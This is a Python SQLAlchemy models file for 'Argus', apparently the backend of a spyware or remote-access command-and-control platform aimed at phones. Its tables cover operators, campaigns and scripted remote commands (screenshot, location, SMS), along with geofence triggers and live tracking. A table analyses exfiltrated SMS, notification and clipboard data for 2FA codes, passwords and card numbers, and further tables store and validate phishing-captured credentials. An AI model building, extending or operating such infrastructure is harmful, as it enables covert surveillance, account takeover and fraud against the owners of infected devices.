"""
Modelos Militares Avançados - Multi-Tenant, GeoFencing, Scripts, Analytics
Sistema Argus - Nível Militar
"""

from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
from sqlalchemy import Column, Integer, String, Text, DateTime, Boolean, Float, JSON, ForeignKey, Enum
from sqlalchemy.orm import relationship
from werkzeug.security import generate_password_hash
import uuid
import enum

# Importar db do models.py principal
from database.backend.models import db

# ====================== MULTI-TENANT ARCHITECTURE ======================

class Operator(db.Model):
    """
    Modelo para múltiplos operadores/campanhas (Multi-Tenant)
    Cada operador tem acesso apenas aos seus dispositivos e comandos
    """
    __tablename__ = 'operators'
    
    id = Column(Integer, primary_key=True)
    operator_id = Column(String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    
    # Informações do operador
    name = Column(String(100), nullable=False)
    code_name = Column(String(50), unique=True, nullable=False)  # Nome de código único
    organization = Column(String(100), nullable=True)
    
    # Autenticação
    api_key = Column(String(64), unique=True, nullable=False)
    api_secret_hash = Column(String(200), nullable=False)
    
    # Permissões
    permission_level = Column(Integer, default=1)  # 1=Basic, 2=Advanced, 3=Full, 4=Admin
    allowed_features = Column(JSON, nullable=True)  # Lista de features permitidas
    
    # Quotas
    max_devices = Column(Integer, default=50)
    max_commands_per_hour = Column(Integer, default=1000)
    max_storage_gb = Column(Float, default=10.0)
    
    # Status
    is_active = Column(Boolean, default=True)
    is_suspended = Column(Boolean, default=False)
    suspension_reason = Column(Text, nullable=True)
    
    # Estatísticas
    total_devices = Column(Integer, default=0)
    total_commands_sent = Column(Integer, default=0)
    storage_used_gb = Column(Float, default=0.0)
    
    # Timing
    created_at = Column(DateTime, default=datetime.utcnow)
    last_active = Column(DateTime, default=datetime.utcnow)
    subscription_expires_at = Column(DateTime, nullable=True)
    
    # Relacionamentos
    campaigns = relationship('Campaign', backref='operator', lazy=True, cascade='all, delete-orphan')
    devices = relationship('Device', backref='operator', lazy=True)
    
    def set_api_secret(self, secret):
        """Define hash do API secret"""
        self.api_secret_hash = generate_password_hash(secret)
    
    def to_dict(self):
        return {
            'id': self.id,
            'operator_id': self.operator_id,
            'name': self.name,
            'code_name': self.code_name,
            'organization': self.organization,
            'permission_level': self.permission_level,
            'max_devices': self.max_devices,
            'total_devices': self.total_devices,
            'is_active': self.is_active,
            'created_at': self.created_at.isoformat(),
            'last_active': self.last_active.isoformat() if self.last_active else None
        }

class Campaign(db.Model):
    """
    Modelo para campanhas de operação
    Permite organizar dispositivos e comandos por campanha/missão
    """
    __tablename__ = 'campaigns'
    
    id = Column(Integer, primary_key=True)
    campaign_id = Column(String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    
    operator_id = Column(Integer, ForeignKey('operators.id'), nullable=False)
    
    # Informações da campanha
    name = Column(String(200), nullable=False)
    code_name = Column(String(100), unique=True, nullable=False)
    description = Column(Text, nullable=True)
    
    # Status
    status = Column(String(20), default='planning')  # planning, active, paused, completed, archived
    priority = Column(String(20), default='normal')  # low, normal, high, critical
    
    # Objetivos
    objectives = Column(JSON, nullable=True)  # Lista de objetivos
    targets = Column(JSON, nullable=True)  # Alvos específicos
    
    # Timing
    start_date = Column(DateTime, nullable=True)
    end_date = Column(DateTime, nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Estatísticas
    total_devices = Column(Integer, default=0)
    total_commands = Column(Integer, default=0)
    success_rate = Column(Float, default=0.0)
    
    # Relacionamentos
    devices_campaigns = relationship('DeviceCampaign', backref='campaign', lazy=True)
    scripts = relationship('CommandScript', backref='campaign', lazy=True)
    geofences = relationship('GeoFence', backref='campaign', lazy=True)
    
    def to_dict(self):
        return {
            'id': self.id,
            'campaign_id': self.campaign_id,
            'operator_id': self.operator_id,
            'name': self.name,
            'code_name': self.code_name,
            'description': self.description,
            'status': self.status,
            'priority': self.priority,
            'start_date': self.start_date.isoformat() if self.start_date else None,
            'end_date': self.end_date.isoformat() if self.end_date else None,
            'total_devices': self.total_devices,
            'total_commands': self.total_commands,
            'success_rate': self.success_rate,
            'created_at': self.created_at.isoformat()
        }

class DeviceCampaign(db.Model):
    """
    Tabela de relacionamento entre dispositivos e campanhas (muitos para muitos)
    """
    __tablename__ = 'device_campaigns'
    
    id = Column(Integer, primary_key=True)
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=False)
    campaign_id = Column(Integer, ForeignKey('campaigns.id'), nullable=False)
    
    # Metadados
    role = Column(String(50), nullable=True)  # Papel do dispositivo na campanha
    status = Column(String(20), default='active')  # active, inactive, completed
    
    assigned_at = Column(DateTime, default=datetime.utcnow)
    completed_at = Column(DateTime, nullable=True)

# ====================== COMMAND SCRIPTING ENGINE ======================

class CommandScript(db.Model):
    """
    Scripts de comandos sequenciais com delays e condições
    Permite criar workflows complexos de comandos
    """
    __tablename__ = 'command_scripts'
    
    id = Column(Integer, primary_key=True)
    script_id = Column(String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    
    campaign_id = Column(Integer, ForeignKey('campaigns.id'), nullable=True)
    
    # Informações do script
    name = Column(String(200), nullable=False)
    description = Column(Text, nullable=True)
    
    # Script definition (JSON)
    # Exemplo: [
    #   {"step": 1, "command": "screenshot", "data": {}, "delay": 0},
    #   {"step": 2, "command": "wait", "seconds": 300},
    #   {"step": 3, "command": "location", "data": {"accuracy": "high"}, "delay": 0},
    #   {"step": 4, "command": "sms", "data": {"number": "+123", "message": "Done"}, "delay": 10}
    # ]
    script_steps = Column(JSON, nullable=False)
    
    # Configurações
    repeat_count = Column(Integer, default=1)  # Número de repetições (0 = infinito)
    repeat_interval_seconds = Column(Integer, default=0)  # Intervalo entre repetições
    
    # Condições de execução
    execution_conditions = Column(JSON, nullable=True)  # Ex: {"battery_min": 20, "wifi_only": true}
    
    # Status
    is_active = Column(Boolean, default=True)
    
    # Timing
    created_at = Column(DateTime, default=datetime.utcnow)
    created_by = Column(String(80), nullable=True)
    
    # Relacionamentos
    executions = relationship('ScriptExecution', backref='script', lazy=True)
    
    def to_dict(self):
        return {
            'id': self.id,
            'script_id': self.script_id,
            'campaign_id': self.campaign_id,
            'name': self.name,
            'description': self.description,
            'script_steps': self.script_steps,
            'repeat_count': self.repeat_count,
            'repeat_interval_seconds': self.repeat_interval_seconds,
            'is_active': self.is_active,
            'created_at': self.created_at.isoformat()
        }

class ScriptExecution(db.Model):
    """
    Execuções de scripts em dispositivos
    """
    __tablename__ = 'script_executions'
    
    id = Column(Integer, primary_key=True)
    execution_id = Column(String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    
    script_id = Column(Integer, ForeignKey('command_scripts.id'), nullable=False)
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=False)
    
    # Status
    status = Column(String(20), default='pending')  # pending, running, completed, failed, paused
    current_step = Column(Integer, default=0)
    total_steps = Column(Integer, nullable=False)
    
    # Progress
    steps_completed = Column(Integer, default=0)
    steps_failed = Column(Integer, default=0)
    progress_percentage = Column(Float, default=0.0)
    
    # Resultados
    step_results = Column(JSON, nullable=True)  # Resultados de cada step
    error_message = Column(Text, nullable=True)
    
    # Timing
    started_at = Column(DateTime, default=datetime.utcnow)
    completed_at = Column(DateTime, nullable=True)
    next_execution_at = Column(DateTime, nullable=True)  # Para scripts repetitivos
    
    def to_dict(self):
        return {
            'id': self.id,
            'execution_id': self.execution_id,
            'script_id': self.script_id,
            'device_id': self.device_id,
            'status': self.status,
            'current_step': self.current_step,
            'total_steps': self.total_steps,
            'progress_percentage': self.progress_percentage,
            'started_at': self.started_at.isoformat(),
            'completed_at': self.completed_at.isoformat() if self.completed_at else None
        }

# ====================== GEO-FENCING & TRIGGERS ======================

class GeoFence(db.Model):
    """
    Geo-cercas para acionamento automático de ações
    """
    __tablename__ = 'geofences'
    
    id = Column(Integer, primary_key=True)
    geofence_id = Column(String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    
    campaign_id = Column(Integer, ForeignKey('campaigns.id'), nullable=True)
    
    # Informações da geo-cerca
    name = Column(String(200), nullable=False)
    description = Column(Text, nullable=True)
    
    # Tipo de cerca
    fence_type = Column(String(20), default='circle')  # circle, polygon, route
    
    # Coordenadas (circle)
    center_latitude = Column(Float, nullable=True)
    center_longitude = Column(Float, nullable=True)
    radius_meters = Column(Float, nullable=True)
    
    # Coordenadas (polygon) - array de [lat, lon]
    polygon_coordinates = Column(JSON, nullable=True)
    
    # Triggers
    trigger_on_enter = Column(Boolean, default=True)
    trigger_on_exit = Column(Boolean, default=False)
    trigger_on_dwell = Column(Boolean, default=False)  # Permanecer por X tempo
    dwell_time_seconds = Column(Integer, default=300)  # 5 minutos
    
    # Ações a executar (script ou comandos diretos)
    action_script_id = Column(Integer, ForeignKey('command_scripts.id'), nullable=True)
    action_commands = Column(JSON, nullable=True)  # Lista de comandos diretos
    
    # Configurações
    is_active = Column(Boolean, default=True)
    priority = Column(String(20), default='normal')
    
    # Dispositivos alvo
    target_devices = Column(JSON, nullable=True)  # Lista de device_ids (null = todos)
    
    # Timing
    active_from = Column(DateTime, nullable=True)  # Ativa apenas em período específico
    active_until = Column(DateTime, nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    # Estatísticas
    trigger_count = Column(Integer, default=0)
    last_triggered_at = Column(DateTime, nullable=True)
    
    # Relacionamentos
    triggers = relationship('GeoFenceTrigger', backref='geofence', lazy=True)
    
    def to_dict(self):
        return {
            'id': self.id,
            'geofence_id': self.geofence_id,
            'campaign_id': self.campaign_id,
            'name': self.name,
            'description': self.description,
            'fence_type': self.fence_type,
            'center_latitude': self.center_latitude,
            'center_longitude': self.center_longitude,
            'radius_meters': self.radius_meters,
            'trigger_on_enter': self.trigger_on_enter,
            'trigger_on_exit': self.trigger_on_exit,
            'is_active': self.is_active,
            'trigger_count': self.trigger_count,
            'created_at': self.created_at.isoformat()
        }

class GeoFenceTrigger(db.Model):
    """
    Registro de triggers de geo-cercas
    """
    __tablename__ = 'geofence_triggers'
    
    id = Column(Integer, primary_key=True)
    
    geofence_id = Column(Integer, ForeignKey('geofences.id'), nullable=False)
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=False)
    
    # Informações do trigger
    trigger_type = Column(String(20), nullable=False)  # enter, exit, dwell
    
    # Localização no momento do trigger
    trigger_latitude = Column(Float, nullable=False)
    trigger_longitude = Column(Float, nullable=False)
    
    # Ações executadas
    actions_executed = Column(JSON, nullable=True)
    execution_status = Column(String(20), default='pending')  # pending, executing, completed, failed
    
    # Timing
    triggered_at = Column(DateTime, default=datetime.utcnow)
    completed_at = Column(DateTime, nullable=True)
    
    def to_dict(self):
        return {
            'id': self.id,
            'geofence_id': self.geofence_id,
            'device_id': self.device_id,
            'trigger_type': self.trigger_type,
            'trigger_latitude': self.trigger_latitude,
            'trigger_longitude': self.trigger_longitude,
            'execution_status': self.execution_status,
            'triggered_at': self.triggered_at.isoformat()
        }

# ====================== THREAT INTELLIGENCE ======================

class ThreatIntelligence(db.Model):
    """
    Análise automática de dados exfiltrados
    Detecta automaticamente: códigos 2FA, senhas, cartões, informações sensíveis
    """
    __tablename__ = 'threat_intelligence'
    
    id = Column(Integer, primary_key=True)
    intelligence_id = Column(String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=False)
    
    # Tipo de inteligência detectada
    intel_type = Column(String(50), nullable=False)  # 2fa_code, password, credit_card, sensitive_info, etc.
    intel_category = Column(String(50), nullable=False)  # authentication, financial, personal, corporate
    
    # Dados detectados
    raw_data = Column(Text, nullable=False)  # Dado original
    extracted_value = Column(Text, nullable=True)  # Valor extraído (ex: código 2FA)
    
    # Fonte
    source_type = Column(String(50), nullable=False)  # sms, notification, screenshot, clipboard, etc.
    source_id = Column(Integer, nullable=True)  # ID do registro original (sms_id, notification_id, etc.)
    
    # Contexto
    related_app = Column(String(200), nullable=True)  # App relacionado (ex: "WhatsApp", "Banco XYZ")
    confidence_score = Column(Float, default=0.0)  # 0.0 - 1.0
    
    # Classificação de risco
    risk_level = Column(String(20), default='medium')  # low, medium, high, critical
    is_actionable = Column(Boolean, default=True)  # Se requer ação imediata
    
    # Status
    is_processed = Column(Boolean, default=False)
    is_exported = Column(Boolean, default=False)
    notes = Column(Text, nullable=True)
    
    # Timing
    detected_at = Column(DateTime, default=datetime.utcnow)
    expires_at = Column(DateTime, nullable=True)  # Para códigos 2FA temporários
    
    def to_dict(self):
        return {
            'id': self.id,
            'intelligence_id': self.intelligence_id,
            'device_id': self.device_id,
            'intel_type': self.intel_type,
            'intel_category': self.intel_category,
            'extracted_value': self.extracted_value,
            'source_type': self.source_type,
            'related_app': self.related_app,
            'confidence_score': self.confidence_score,
            'risk_level': self.risk_level,
            'is_actionable': self.is_actionable,
            'detected_at': self.detected_at.isoformat()
        }

# ====================== ANALYTICS & METRICS ======================

class Analytics(db.Model):
    """
    Métricas e analytics para Grafana/Kibana
    """
    __tablename__ = 'analytics'
    
    id = Column(Integer, primary_key=True)
    
    # Tipo de métrica
    metric_type = Column(String(50), nullable=False)  # device_count, command_success_rate, data_volume, etc.
    metric_category = Column(String(50), nullable=False)  # devices, commands, data, performance
    
    # Valores
    metric_value = Column(Float, nullable=False)
    metric_unit = Column(String(20), nullable=True)  # count, percentage, bytes, seconds, etc.
    
    # Dimensões (para filtros)
    operator_id = Column(Integer, ForeignKey('operators.id'), nullable=True)
    campaign_id = Column(Integer, ForeignKey('campaigns.id'), nullable=True)
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=True)
    
    # Metadados adicionais
    tags = Column(JSON, nullable=True)
    dimensions = Column(JSON, nullable=True)
    
    # Timing (importante para séries temporais)
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
    
    def to_dict(self):
        return {
            'id': self.id,
            'metric_type': self.metric_type,
            'metric_category': self.metric_category,
            'metric_value': self.metric_value,
            'metric_unit': self.metric_unit,
            'timestamp': self.timestamp.isoformat()
        }

class MapTrackingPoint(db.Model):
    """
    Pontos de tracking otimizados para mapa em tempo real
    """
    __tablename__ = 'map_tracking_points'
    
    id = Column(Integer, primary_key=True)
    
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=False, index=True)
    
    # Coordenadas
    latitude = Column(Float, nullable=False)
    longitude = Column(Float, nullable=False)
    
    # Metadados mínimos para performance
    accuracy = Column(Float, nullable=True)
    battery_level = Column(Float, nullable=True)
    speed = Column(Float, nullable=True)
    
    # Status
    is_current = Column(Boolean, default=True)  # Apenas o mais recente fica True
    
    # Timing
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
    
    def to_dict(self):
        return {
            'device_id': self.device_id,
            'latitude': self.latitude,
            'longitude': self.longitude,
            'accuracy': self.accuracy,
            'battery_level': self.battery_level,
            'speed': self.speed,
            'timestamp': self.timestamp.isoformat()
        }

# ====================== PHISHING SYSTEM ======================

class PhishingCredential(db.Model):
    """
    Credenciais capturadas através de phishing
    """
    __tablename__ = 'phishing_credentials'
    
    id = Column(Integer, primary_key=True)
    credential_id = Column(String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    
    device_id = Column(Integer, ForeignKey('devices.id'), nullable=False)
    
    # Plataforma (gmail, facebook, instagram, whatsapp, banco, etc.)
    platform = Column(String(50), nullable=False, index=True)
    
    # Credenciais capturadas
    username = Column(String(255), nullable=False)  # Email, telefone ou username
    password = Column(String(255), nullable=True)  # Pode ser None em capturas de multi-step
    
    # Dados adicionais (JSON)
    # Pode conter: verification_code, security_questions, etc.
    additional_data = Column(JSON, nullable=True)
    
    # Metadados da captura
    ip_address = Column(String(45), nullable=True)
    user_agent = Column(Text, nullable=True)
    
    # Validação
    is_valid = Column(Boolean, nullable=True)  # None = não testado, True = válido, False = inválido
    validated_at = Column(DateTime, nullable=True)
    validation_method = Column(String(50), nullable=True)  # manual, auto, api
    
    # Observações
    notes = Column(Text, nullable=True)
    
    # Timing
    captured_at = Column(DateTime, default=datetime.utcnow, index=True)
    
    def to_dict(self):
        return {
            'id': self.id,
            'credential_id': self.credential_id,
            'device_id': self.device_id,
            'platform': self.platform,
            'username': self.username,
            'password': self.password if self.password else '[CAPTURED]',
            'additional_data': self.additional_data,
            'ip_address': self.ip_address,
            'is_valid': self.is_valid,
            'validated_at': self.validated_at.isoformat() if self.validated_at else None,
            'notes': self.notes,
            'captured_at': self.captured_at.isoformat()
        }

class PhishingCampaign(db.Model):
    """
    Campanhas de phishing organizadas
    """
    __tablename__ = 'phishing_campaigns'
    
    id = Column(Integer, primary_key=True)
    campaign_id = Column(String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    
    # Informações da campanha
    name = Column(String(200), nullable=False)
    description = Column(Text, nullable=True)
    
    # Plataforma alvo
    target_platform = Column(String(50), nullable=False)  # gmail, facebook, etc.
    
    # Template usado
    template_name = Column(String(100), nullable=False)
    custom_template = Column(Text, nullable=True)  # HTML customizado (opcional)
    
    # Configurações
    auto_deploy = Column(Boolean, default=False)  # Deploy automático para novos dispositivos
    target_devices = Column(JSON, nullable=True)  # Lista de device_ids alvo (null = todos)
    
    # Status
    is_active = Column(Boolean, default=True)
    
    # Estatísticas
    total_deployments = Column(Integer, default=0)
    total_captures = Column(Integer, default=0)
    success_rate = Column(Float, default=0.0)
    
    # Timing
    created_at = Column(DateTime, default=datetime.utcnow)
    started_at = Column(DateTime, nullable=True)
    ended_at = Column(DateTime, nullable=True)
    
    def to_dict(self):
        return {
            'id': self.id,
            'campaign_id': self.campaign_id,
            'name': self.name,
            'description': self.description,
            'target_platform': self.target_platform,
            'template_name': self.template_name,
            'is_active': self.is_active,
            'total_deployments': self.total_deployments,
            'total_captures': self.total_captures,
            'success_rate': self.success_rate,
            'created_at': self.created_at.isoformat(),
            'started_at': self.started_at.isoformat() if self.started_at else None
        }

